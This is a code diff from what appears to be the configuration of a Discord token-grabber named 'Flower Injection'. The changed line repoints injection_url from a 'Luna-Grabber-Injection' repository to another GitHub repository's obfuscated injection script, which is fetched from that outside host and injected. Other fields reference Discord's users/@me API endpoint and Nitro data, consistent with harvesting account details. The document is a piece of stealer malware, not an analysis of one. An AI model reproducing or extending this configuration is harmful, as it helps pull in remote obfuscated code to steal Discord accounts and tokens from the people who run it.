@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Flower Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1258433528547508307/1261321822528475187/discord-avatar-512-T3B9E.gif?ex=669288fc&is=6691377c&hm=ac6342324e4ea155595b60ec10e41dd98d65edaed73f5b370cb639dbcbb8be3c&', 
   embed_color: 111111, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/Trwwillowzz/injection/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
